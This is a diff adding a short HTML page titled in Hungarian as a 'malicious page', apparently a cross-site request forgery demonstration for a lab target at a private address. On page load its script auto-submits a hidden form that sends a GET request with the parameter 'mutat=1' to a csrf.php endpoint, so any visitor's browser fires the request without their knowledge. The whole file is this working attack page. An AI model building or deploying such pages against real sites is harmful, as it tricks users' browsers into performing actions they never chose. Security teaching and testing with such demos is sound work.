@@ -1,0 +1,15 @@
+<html>
+<head>
+    <title>Rosszindulatú oldal</title>
+    <script>
+        window.onload = function() {
+            document.forms[0].submit();
+        }
+    </script>
+</head>
+<body>
+    <form action="http://172.20.0.208/csrf.php" method="get">
+        <input type="hidden" name="mutat" value="1">
+    </form>
+</body>
+</html>
